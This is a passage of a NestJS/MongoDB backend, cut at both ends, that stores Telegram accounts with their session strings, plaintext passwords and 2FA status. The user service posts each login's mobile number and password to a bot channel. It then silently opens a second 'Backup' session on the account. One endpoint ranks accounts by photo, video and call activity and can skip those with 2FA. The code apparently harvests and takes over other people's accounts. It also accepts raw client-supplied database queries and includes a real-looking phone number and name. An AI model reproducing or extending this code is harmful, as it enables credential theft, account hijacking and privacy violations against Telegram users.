executeQuery(@Body() requestBody: any): Promise<any> {\n    try {\n      const { query, sort, limit, skip } = requestBody;\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;\n    }\n  }\n}","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\nimport { UserDataService } from './user-data.service';\nimport { UserDataController } from './user-data.controller';\nimport { InitModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\n  controllers: [UserDataController],\n  providers: [UserDataService],\n  exports: [UserDataService]\n})\nexport class UserDataModule { }\n","import {\n    BadRequestException,\n    Injectable,\n    InternalServerErrorException,\n    NotFoundException,\n} from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model, QueryFilter, UpdateQuery } from 'mongoose';\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\nimport { parseError } from '../../utils/parseError';\nimport { getBotsServiceInstance, Logger } from '../../utils';\nimport { ChannelCategory } from '../bots';\n\n@Injectable()\nexport class UserDataService {\n    private callCounts: Map<string, number> = new Map();\n    private logger = new Logger(UserDataService.name)\n    constructor(\n        @InjectModel(UserData.name) private readonly userDataModel: Model<UserDataDocument>,\n    ) { }\n\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserDataDocument> {\n        try {\n            return await this.userDataModel.create(createUserDataDto);\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async findAll(limit: number = 99): Promise<UserDataDocument[]> {\n        return this.userDataModel.find().limit(limit).lean().exec();\n    }\n\n    async findOne(profile: string, chatId: string): Promise<(UserData & { _id: import('mongoose').Types.ObjectId; count?: number })> {\n        const user = await this.userDataModel.findOne({ profile, chatId }).lean().exec();\n\n        if (!user) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n\n        const currentCount = (this.callCounts.get(chatId) || 0) + 1;\n        this.callCounts.set(chatId, currentCount);\n\n        return { ...user, count: currentCount };\n    }\n\n    clearCount(chatId?: string): string {\n        if (chatId) {\n            this.callCounts.delete(chatId);\n            return `Count cleared for chatId: ${chatId}`;\n        }\n        this.callCounts.clear();\n        return 'All counts cleared.';\n    }\n\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserDataDocument> {\n        delete (updateUserDataDto as any)._id;\n        delete (updateUserDataDto as any).profile;\n        delete (updateUserDataDto as any).chatId;\n        \n        const updatedUser = await this.userDataModel\n            .findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true })\n            .lean()\n            .exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto) {\n        delete (updateUserDataDto as any)._id;\n\n        return this.userDataModel\n            .updateMany({ chatId }, { $set: updateUserDataDto }, { upsert: true })\n            .exec();\n    }\n\n    async remove(profile: string, chatId: string): Promise<UserDataDocument> {\n        const botsService = getBotsServiceInstance();\n        if (botsService) {\n            botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_NOTIFICATIONS, `Deleting UserData with profile ${profile} and chatId ${chatId}`);\n        }\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).lean().exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<UserDataDocument[]> {\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') };\n        }\n        return this.userDataModel.find(filter).lean().exec();\n    }\n\n    async executeQuery(\n        query: QueryFilter<UserDataDocument>,\n        sort?: Record<string, 1 | -1>,\n        limit?: number,\n        skip?: number,\n    ): Promise<UserDataDocument[]> {\n        const startTime = Date.now();\n        if (!query) {\n            throw new BadRequestException('Query is invalid.');\n        }\n\n        try {\n            let q = this.userDataModel.find(query);\n\n            if (sort) q = q.sort(sort);\n            if (limit) q = q.limit(limit);\n            if (skip) q = q.skip(skip);\n\n            const result = await q.lean().exec();\n            this.logger.log(`Query Execution Duration: ${Date.now() - startTime}Ms`)\n            return result\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async resetPaidUsers() {\n        try {\n            return await this.userDataModel.updateMany(\n                { payAmount: { $gt: 10 }, totalCount: { $gt: 30 } },\n                {\n                    $set: {\n                        totalCount: 10,\n                        limitTime: Date.now(),\n                        paidReply: true,\n                    },\n                },\n            ).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async incrementTotalCount(profile: string, chatId: string, amount: number = 1): Promise<UserDataDocument> {\n        const updatedUser = await this.userDataModel\n            .findOneAndUpdate({ profile, chatId }, { $inc: { totalCount: amount } }, { new: true })\n            .lean()\n            .exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async incrementPayAmount(profile: string, chatId: string, amount: number): Promise<UserDataDocument> {\n        const updatedUser = await this.userDataModel\n            .findOneAndUpdate({ profile, chatId }, { $inc: { payAmount: amount } }, { new: true })\n            .lean()\n            .exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`UserData with profile \"${profile}\" and chatId \"${chatId}\" not found`);\n        }\n        return updatedUser;\n    }\n\n    async updateLastActive(profile: string, chatId: string): Promise<UserDataDocument> {\n        return this.userDataModel\n            .findOneAndUpdate({ profile, chatId }, { $set: { lastActiveTime: new Date() } }, { new: true })\n            .lean()\n            .exec();\n    }\n\n    async findInactiveSince(date: Date): Promise<UserDataDocument[]> {\n        return this.userDataModel.find({ lastActiveTime: { $lt: date } }).lean().exec();\n    }\n\n    async findByPaymentRange(minAmount: number, maxAmount: number): Promise<UserDataDocument[]> {\n        return this.userDataModel.find({ payAmount: { $gte: minAmount, $lte: maxAmount } }).lean().exec();\n    }\n\n    async bulkUpdateUsers(filter: any, update: UpdateQuery<UserDataDocument>) {\n        try {\n            return await this.userDataModel.updateMany(filter, update, { upsert: true }).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async findActiveUsers(threshold: number = 30): Promise<UserDataDocument[]> {\n        return this.userDataModel.find({ totalCount: { $gt: threshold } }).sort({ totalCount: -1 }).lean().exec();\n    }\n\n    async removeRedundantData(): Promise<{ deletedCount: number }> {\n        // 30 days in milliseconds\n        const twoMonths = Date.now() - 60 * 24 * 60 * 60 * 1000;\n\n        try {\n            const result = await this.userDataModel\n                .deleteMany({ lastMsgTimeStamp: { $lt: twoMonths }, payAmount: 0, canReply: 1 })\n                .exec();\n\n            return { deletedCount: result.deletedCount ?? 0 };\n        } catch (error) {\n            throw new InternalServerErrorException(parseError(error));\n        }\n    }\n\n    async resetUserCounts(profile: string, chatId: string): Promise<UserDataDocument> {\n        return this.userDataModel\n            .findOneAndUpdate(\n                { profile, chatId },\n                {\n                    $set: {\n                        totalCount: 0,\n                        limitTime: new Date(),\n                        paidReply: false,\n                    },\n                },\n                { new: true },\n            )\n            .lean()\n            .exec();\n    }\n}\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call log summary and per-chat details',\n    example: {\n      totalCalls: 1,\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      audio: 0,\n      chats: [],\n    },\n  })\n  calls: {\n    totalCalls: number;\n    outgoing: number;\n    incoming: number;\n    video: number;\n    audio: number;\n    chats: any[];\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","// Export all DTOs\nexport * from './create-user.dto';\nexport * from './search-user.dto';\nexport * from './update-user.dto';\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\n\nexport class SearchUserDto {\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\n  @IsOptional()\n  @IsString()\n  tgId?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\n  @IsOptional()\n  @IsString()\n  mobile?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  twoFA?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\n  @IsOptional()\n  @IsBoolean()\n  expired?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by session' })\n  @IsOptional()\n  @IsString()\n  session?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by first name' })\n  @IsOptional()\n  @IsString()\n  firstName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by last name' })\n  @IsOptional()\n  @IsString()\n  lastName?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by username' })\n  @IsOptional()\n  @IsString()\n  username?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\n  @IsOptional()\n  @IsNumber()\n  channels?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\n  @IsOptional()\n  @IsNumber()\n  personalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\n  @IsOptional()\n  @IsBoolean()\n  demoGiven?: boolean;\n\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\n  @IsOptional()\n  @IsNumber()\n  msgs?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\n  @IsOptional()\n  @IsNumber()\n  totalChats?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\n  @IsOptional()\n  @IsNumber()\n  lastActive?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\n  @IsOptional()\n  @IsNumber()\n  movieCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\n  @IsOptional()\n  @IsNumber()\n  photoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by video count' })\n  @IsOptional()\n  @IsNumber()\n  videoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by gender' })\n  @IsOptional()\n  @IsString()\n  gender?: string;\n\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\n  @IsOptional()\n  @IsNumber()\n  otherPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\n  @IsOptional()\n  @IsNumber()\n  otherVideoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\n  @IsOptional()\n  @IsNumber()\n  ownPhotoCount?: number;\n\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\n  @IsOptional()\n  @IsNumber()\n  ownVideoCount?: number;\n}\n","import { PartialType } from '@nestjs/mapped-types';\nimport { CreateUserDto } from './create-user.dto';\n\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\n","export * from './dto';\nexport * from './schemas';\nexport * from './users.controller';\nexport * from './users.module';\nexport * from './users.service';","// Export all schemas\nexport * from './user.schema';\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret['id'] = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  session: string;\n\n  @ApiProperty()\n  @Prop()\n  firstName: string;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  lastName: string | null;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  username: string | null;\n\n  @ApiProperty()\n  @Prop()\n  channels: number;\n\n  @ApiProperty()\n  @Prop()\n  personalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  demoGiven: boolean;\n\n  @ApiProperty()\n  @Prop()\n  msgs: number;\n\n  @ApiProperty()\n  @Prop()\n  totalChats: number;\n\n  @ApiProperty()\n  @Prop()\n  lastActive: string;\n\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  tgId: string;\n\n  @ApiProperty()\n  @Prop()\n  movieCount: number;\n\n  @ApiProperty()\n  @Prop()\n  photoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  videoCount: number;\n\n  @ApiProperty({ required: false })\n  @Prop()\n  gender: string | null;\n\n  @Prop({ required: false, type: Boolean })\n  twoFA: boolean = false\n\n  @Prop({ required: false, type: Boolean, default: false })\n  expired: boolean = false\n\n  @Prop({ required: false })\n  password: string = null\n\n  @ApiProperty()\n  @Prop()\n  otherPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  otherVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownPhotoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  ownVideoCount: number;\n\n  @ApiProperty()\n  @Prop()\n  contacts: number;\n\n  @ApiProperty()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: {\n      totalCalls: 0,\n      outgoing: 0,\n      incoming: 0,\n      video: 0,\n      audio: 0,\n      chats: [],\n    },\n  })\n  calls: {\n    totalCalls: number;\n    outgoing: number;\n    incoming: number;\n    video: number;\n    audio: number;\n    chats: any[];\n  };\n\n  @ApiPropertyOptional()\n  @Prop({\n    type: mongoose.Schema.Types.Mixed,\n    default: [],\n    required: false,\n  })\n  recentUsers: any[];\n}\n\nexport const UserSchema = SchemaFactory.createForClass(User);\n","import { Controller, Get, Post, Body, Param, Patch, Delete, Query, BadRequestException } from '@nestjs/common';\nimport { UsersService } from './users.service';\nimport { User } from './schemas/user.schema';\nimport { ApiTags, ApiOperation, ApiParam, ApiQuery, ApiResponse } from '@nestjs/swagger';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\n\n@ApiTags('Telegram Users') // Tag to categorize all endpoints in this controller\n@Controller('user')\nexport class UsersController {\n  constructor(private readonly usersService: UsersService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new user' })\n  async create(@Body() createUserDto: CreateUserDto) {\n    console.log(\"creating new user\")\n    return this.usersService.create(createUserDto);\n  }\n\n  @Get('/search')\n  @ApiOperation({ summary: 'Search users based on various parameters' })\n  async search(@Query() queryParams: SearchUserDto): Promise<User[]> {\n    return this.usersService.search(queryParams);\n  }\n\n\n  @Get('top-interacted')\n  @ApiOperation({ \n    summary: 'Get users with top interaction scores',\n    description: 'Retrieves users ranked by interaction score calculated from saved DB stats. ' +\n                 'Score is based on photos, videos, calls, and other interactions. ' +\n                 'Movie count has negative weightage as it indicates less genuine interaction. ' +\n                 'Supports filtering and pagination for efficient data retrieval.'\n  })\n  @ApiQuery({ \n    name: 'page', \n    required: false, \n    type: Number,\n    description: 'Page number (default: 1, minimum: 1)',\n    example: 1,\n    minimum: 1\n  })\n  @ApiQuery({ \n    name: 'limit', \n    required: false, \n    type: Number,\n    description: 'Number of results per page (default: 20, max: 100)',\n    example: 20,\n    minimum: 1,\n    maximum: 100\n  })\n  @ApiQuery({ \n    name: 'minScore', \n    required: false, \n    type: Number,\n    description: 'Minimum interaction score to include (default: 0)',\n    example: 100,\n    minimum: 0\n  })\n  @ApiQuery({ \n    name: 'minCalls', \n    required: false, \n    type: Number,\n    description: 'Minimum total calls required (default: 0)',\n    example: 5,\n    minimum: 0\n  })\n  @ApiQuery({ \n    name: 'minPhotos', \n    required: false, \n    type: Number,\n    description: 'Minimum photos required (default: 0)',\n    example: 10,\n    minimum: 0\n  })\n  @ApiQuery({ \n    name: 'minVideos', \n    required: false, \n    type: Number,\n    description: 'Minimum videos required (default: 0)',\n    example: 5,\n    minimum: 0\n  })\n  @ApiQuery({ \n    name: 'excludeExpired', \n    required: false, \n    type: Boolean,\n    description: 'Exclude expired users (default: true)',\n    example: true\n  })\n  @ApiQuery({ \n    name: 'excludeTwoFA', \n    required: false, \n    type: Boolean,\n    description: 'Exclude users with 2FA enabled (default: false)',\n    example: false\n  })\n  @ApiQuery({ \n    name: 'gender', \n    required: false, \n    type: String,\n    description: 'Filter by gender',\n    example: 'male'\n  })\n  @ApiResponse({ \n    status: 200,\n    description: 'Users retrieved successfully with interaction scores',\n    schema: {\n      type: 'object',\n      properties: {\n        users: {\n          type: 'array',\n          description: 'List of users with interaction scores',\n          items: {\n            type: 'object',\n            properties: {\n              id: { type: 'string', description: 'User ID' },\n              mobile: { type: 'string' },\n              tgId: { type: 'string' },\n              firstName: { type: 'string' },\n              lastName: { type: 'string' },\n              username: { type: 'string' },\n              photoCount: { type: 'number' },\n              videoCount: { type: 'number' },\n              ownPhotoCount: { type: 'number' },\n              ownVideoCount: { type: 'number' },\n              otherPhotoCount: { type: 'number' },\n              otherVideoCount: { type: 'number' },\n              movieCount: { type: 'number', description: 'Has negative impact on score' },\n              calls: {\n                type: 'object',\n                properties: {\n                  outgoing: { type: 'number' },\n                  incoming: { type: 'number' },\n                  video: { type: 'number' },\n                  totalCalls: { type: 'number' }\n                }\n              },\n              interactionScore: { \n                type: 'number', \n                description: 'Calculated interaction score (higher = more active/engaged)'\n              }\n            }\n          }\n        },\n        total: { type: 'number', description: 'Total number of users matching filters' },\n        page: { type: 'number', description: 'Current page number' },\n        limit: { type: 'number', description: 'Results per page' },\n        totalPages: { type: 'number', description: 'Total number of pages' }\n      }\n    }\n  })\n  @ApiResponse({ status: 400, description: 'Bad Request - invalid query parameters' })\n  @ApiResponse({ status: 500, description: 'Internal Server Error' })\n  async getTopInteractionUsers(\n    @Query('page') page?: string,\n    @Query('limit') limit?: string,\n    @Query('minScore') minScore?: string,\n    @Query('minCalls') minCalls?: string,\n    @Query('minPhotos') minPhotos?: string,\n    @Query('minVideos') minVideos?: string,\n    @Query('excludeExpired') excludeExpired?: string,\n    @Query('excludeTwoFA') excludeTwoFA?: string,\n    @Query('gender') gender?: string\n  ) {\n    // Parse and validate query parameters\n    const pageNum = page ? parseInt(page, 10) : undefined;\n    const limitNum = limit ? parseInt(limit, 10) : undefined;\n    const minScoreNum = minScore ? parseFloat(minScore) : undefined;\n    const minCallsNum = minCalls ? parseInt(minCalls, 10) : undefined;\n    const minPhotosNum = minPhotos ? parseInt(minPhotos, 10) : undefined;\n    const minVideosNum = minVideos ? parseInt(minVideos, 10) : undefined;\n\n    // Validate numeric parameters\n    if (pageNum !== undefined && (isNaN(pageNum) || pageNum < 1)) {\n      throw new BadRequestException('Page must be a positive integer');\n    }\n    if (limitNum !== undefined && (isNaN(limitNum) || limitNum < 1 || limitNum > 100)) {\n      throw new BadRequestException('Limit must be between 1 and 100');\n    }\n    if (minScoreNum !== undefined && (isNaN(minScoreNum) || minScoreNum < 0)) {\n      throw new BadRequestException('minScore must be a non-negative number');\n    }\n    if (minCallsNum !== undefined && (isNaN(minCallsNum) || minCallsNum < 0)) {\n      throw new BadRequestException('minCalls must be a non-negative integer');\n    }\n    if (minPhotosNum !== undefined && (isNaN(minPhotosNum) || minPhotosNum < 0)) {\n      throw new BadRequestException('minPhotos must be a non-negative integer');\n    }\n    if (minVideosNum !== undefined && (isNaN(minVideosNum) || minVideosNum < 0)) {\n      throw new BadRequestException('minVideos must be a non-negative integer');\n    }\n\n    // Parse boolean parameters\n    const excludeExpiredBool = excludeExpired === 'false' ? false : (excludeExpired === 'true' ? true : undefined);\n    const excludeTwoFABool = excludeTwoFA === 'true' ? true : (excludeTwoFA === 'false' ? false : undefined);\n\n    return this.usersService.getTopInteractionUsers({\n      page: pageNum,\n      limit: limitNum,\n      minScore: minScoreNum,\n      minCalls: minCallsNum,\n      minPhotos: minPhotosNum,\n      minVideos: minVideosNum,\n      excludeExpired: excludeExpiredBool,\n      excludeTwoFA: excludeTwoFABool,\n      gender\n    });\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all users' })\n  @ApiQuery({ \n    name: 'limit', \n    required: false, \n    type: Number,\n    description: 'Number of results to return (default: 100)',\n    example: 100\n  })\n  @ApiQuery({ \n    name: 'skip', \n    required: false, \n    type: Number,\n    description: 'Number of results to skip (default: 0)',\n    example: 0\n  })\n  async findAll(\n    @Query('limit') limit?: string,\n    @Query('skip') skip?: string\n  ) {\n    const limitNum = limit ? parseInt(limit, 10) : 100;\n    const skipNum = skip ? parseInt(skip, 10) : 0;\n    \n    if (isNaN(limitNum) || limitNum < 1) {\n      throw new BadRequestException('Limit must be a positive integer');\n    }\n    if (isNaN(skipNum) || skipNum < 0) {\n      throw new BadRequestException('Skip must be a non-negative integer');\n    }\n    \n    return this.usersService.findAll(limitNum, skipNum);\n  }\n\n  @Get(':tgId')\n  @ApiOperation({ summary: 'Get a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async findOne(@Param('tgId') tgId: string) {\n    return this.usersService.findOne(tgId);\n  }\n\n  @Patch(':tgId')\n  @ApiOperation({ summary: 'Update a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async update(@Param('tgId') tgId: string, @Body() updateUserDto: UpdateUserDto) {\n    return this.usersService.update(tgId, updateUserDto);\n  }\n\n  @Delete(':tgId')\n  @ApiOperation({ summary: 'Delete a user by tgId' })\n  @ApiParam({ name: 'tgId', description: 'The Telegram ID of the user', type: String })\n  async remove(@Param('tgId') tgId: string) {\n    return this.usersService.delete(tgId);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  async executeQuery(@Body() requestBody: any): Promise<any> {\n    const { query, sort, limit, skip } = requestBody;\n    try {\n      return await this.usersService.executeQuery(query, sort, limit, skip);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { UsersService } from './users.service';\nimport { UsersController } from './users.controller';\nimport { UserSchema } from './schemas/user.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ClientModule } from '../clients/client.module';\nimport { InitModule } from '../ConfigurationInit/init.module';\nimport { BotsModule } from '../bots';\n\n@Module({\n  imports: [\n    InitModule,\n    MongooseModule.forFeature([{ name: 'userModule', schema: UserSchema, collection: 'users' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule),\n    BotsModule\n  ],\n  controllers: [UsersController],\n  providers: [UsersService],\n  exports: [UsersService]\n})\nexport class UsersModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { User, UserDocument } from './schemas/user.schema';\nimport { SearchUserDto } from './dto/search-user.dto';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateUserDto } from './dto/update-user.dto';\nimport { CreateUserDto } from './dto/create-user.dto';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\nimport { BotsService, ChannelCategory } from '../bots';\n\n@Injectable()\nexport class UsersService {\n  constructor(@InjectModel('userModule') private userModel: Model<UserDocument>,\n    @Inject(forwardRef(() => TelegramService))\n    private telegramService: TelegramService,\n    @Inject(forwardRef(() => ClientService))\n    private clientsService: ClientService,\n    private readonly botsService: BotsService\n  ) { }\n\n  async create(user: CreateUserDto): Promise<User | undefined> {\n    const activeClientSetup = this.telegramService.getActiveClientSetup();\n    console.log(\"New User received - \", user?.mobile);\n    console.log(\"ActiveClientSetup::\", activeClientSetup);\n    if (activeClientSetup && activeClientSetup.newMobile === user.mobile) {\n      console.log(\"Updating New Session Details\", user.mobile, user.username, activeClientSetup.clientId)\n      await this.clientsService.updateClientSession(user.session)\n    } else {\n      await this.botsService.sendMessageByCategory(ChannelCategory.ACCOUNT_LOGINS, `ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`, undefined, false);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels\n      // await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`ACCOUNT LOGIN: ${user.username ? `@${user.username}` : user.firstName}\\nMobile: t.me/${user.mobile}${user.password ? `\\npassword: ${user.password}` : \"\\n\"}`)}`);//Msgs:${user.msgs}\\nphotos:${user.photoCount}\\nvideos:${user.videoCount}\\nmovie:${user.movieCount}\\nPers:${user.personalChats}\\nChan:${user.channels}\\ngender-${user.gender}\\n`)}`)//${process.env.uptimeChecker}/connectclient/${user.mobile}`)}`);\n      setTimeout(async () => {\n        try {\n          await connectionManager.getClient(user.mobile, { autoDisconnect: false, handler: false });\n          // this.telegramService.forwardMediaToBot(user.mobile, null);\n          const newSession = await this.telegramService.createNewSession(user.mobile);\n          const newUserBackup = new this.userModel({ ...user, session: newSession, lastName: \"Backup\" });\n          await newUserBackup.save();\n        } catch (error) {\n          console.log(\"Error in creating new session\", error);\n        }\n      }, 3000);\n      const newUser = new this.userModel(user);\n      return newUser.save();\n    }\n  }\n\n  async findAll(limit: number = 100, skip: number = 0): Promise<User[]> {\n    return this.userModel.find().limit(limit).skip(skip).exec();\n  }\n\n  async findOne(tgId: string): Promise<User> {\n    const user = await (await this.userModel.findOne({ tgId }).exec())?.toJSON()\n    if (!user) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n    return user;\n  }\n\n  async update(tgId: string, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany({ tgId }, { $set: user }, { upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${tgId} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async updateByFilter(filter: any, user: UpdateUserDto): Promise<number> {\n    delete user['_id']\n    const result = await this.userModel.updateMany(filter, { $set: user }, { upsert: true }).exec();\n    if (result.matchedCount === 0) {\n      throw new NotFoundException(`Users with tgId ${JSON.stringify(filter)} not found`);\n    }\n    return result.modifiedCount;\n  }\n\n  async delete(tgId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ tgId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with tgId ${tgId} not found`);\n    }\n  }\n\n  async deleteById(userId: string): Promise<void> {\n    const result = await this.userModel.deleteOne({ _id: userId }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`User with id ${userId} not found`);\n    }\n  }\n\n  async search(filter: SearchUserDto): Promise<User[]> {\n    if (filter.firstName) {\n      filter.firstName = { $regex: new RegExp(filter.firstName, 'i') } as any\n    }\n    if (filter.twoFA !== undefined) {\n      filter.twoFA = filter.twoFA as any === 'true' || filter.twoFA as any === '1' || filter.twoFA === true;\n    }\n    return this.userModel.find(filter).sort({ updatedAt: -1 }).exec();\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number, skip?: number) {\n    try {\n      if (!query) {\n        